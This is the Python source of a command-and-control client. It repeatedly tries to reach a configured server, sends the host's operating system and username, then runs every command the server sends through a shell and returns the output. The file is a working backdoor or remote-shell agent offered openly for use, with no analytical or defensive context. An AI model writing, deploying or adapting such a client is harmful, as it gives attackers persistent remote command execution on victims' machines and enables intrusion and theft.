import socket
import time
import os
import json
import subprocess
import platform  # 用于检测系统类型

class C2Client:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def connect_to_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print("Connected to C2 server")
                self.send_system_info()
                break
            except Exception as e:
                print(f"Connection failed: {e}")
                time.sleep(5)

    def send_system_info(self):
        system_info = {
            "system": platform.system(),
            "user": os.getlogin()
        }
        self.socket.send(json.dumps(system_info).encode())

    def listen_for_commands(self):
        while True:
            try:
                data = self.socket.recv(4096).decode()
                if not data:
                    continue
                data = json.loads(data)
                if "command" in data:
                    command = data["command"]
                    print(f"Received command: {command}")
                    if command == "exit":
                        self.socket.close()
                        break
                    else:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                        self.socket.send(json.dumps({"result": output}).encode())
            except (ValueError, json.JSONDecodeError) as e:
                print(f"Error decoding: {e}")
            except Exception as e:
                print(f"Error: {e}")
                self.socket.close()
                self.connect_to_server()

if __name__ == "__main__":
    client = C2Client("IP地址", 8888)  # 更改为C2控制台IP地址
    client.connect_to_server()
    client.listen_for_commands()
